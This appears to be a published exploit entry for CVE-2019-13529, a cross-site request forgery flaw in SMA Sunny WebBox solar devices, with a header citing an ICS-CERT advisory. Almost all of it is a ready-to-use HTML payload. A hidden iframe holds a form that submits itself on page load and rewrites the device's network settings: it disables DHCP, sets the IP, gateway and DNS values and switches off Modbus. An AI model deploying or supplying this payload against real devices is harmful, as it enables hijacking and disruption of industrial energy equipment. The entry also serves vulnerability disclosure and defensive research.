# Exploit Author: Borja Merino and Eduardo Villaverde
# Vendor Homepage: https://www.sma.de
# Version: Firmware Version 1.6 and prior
# Tested on: Sunny WebBox SMA Solar Device (Firmware Version 1.6)
# CVE : CVE-2019-13529
# ICS-Cert Advisory: https://www.us-cert.gov/ics/advisories/icsa-19-281-01

<!-- Change any hidden value -->

<iframe style="display:none" name="csrf-frame"></iframe>
<form method=&#039;POST&#039; action=&#039;http://X.X.X.X/wb_network_changed.htm&#039; target="csrf-frame" id="csrf-form">
  <input type=&#039;hidden&#039; name=&#039;RadioButtonDhcp&#039; value=&#039;off&#039;>
  <input type=&#039;hidden&#039; name=&#039;IpAddr&#039; value=&#039;1.1.1.1&#039;>
  <input type=&#039;hidden&#039; name=&#039;SubnetMask&#039; value=&#039;255.255.255.0&#039;>
  <input type=&#039;hidden&#039; name=&#039;Gateway&#039; value=&#039;1.1.1.1&#039;> 
  <input type=&#039;hidden&#039; name=&#039;DnsIpAddr&#039; value=&#039;5.5.5.1&#039;>
  <input type=&#039;hidden&#039; name=&#039;Dns2IpAddr&#039; value=&#039;5.5.5.2&#039;>
  <input type=&#039;hidden&#039; name=&#039;StaticNatPortHttp&#039; value=&#039;80&#039;>
  <input type=&#039;hidden&#039; name=&#039;WebserverPort&#039; value=&#039;80&#039;>
  <input type=&#039;hidden&#039; name=&#039;WebservicePort&#039; value=&#039;80&#039;>
  <input type=&#039;hidden&#039; name=&#039;RadioButtonModbus&#039; value=&#039;off&#039;>
  <input type=&#039;hidden&#039; name=&#039;ModbusPort&#039; value=&#039;502&#039;>
  <input type=&#039;hidden&#039; name=&#039;BConfirm&#039; value=&#039;Confirmar&#039;>
  <input type=&#039;submit&#039; value=&#039;submit&#039;>
</form>
<script>document.getElementById("csrf-form").submit()</script>

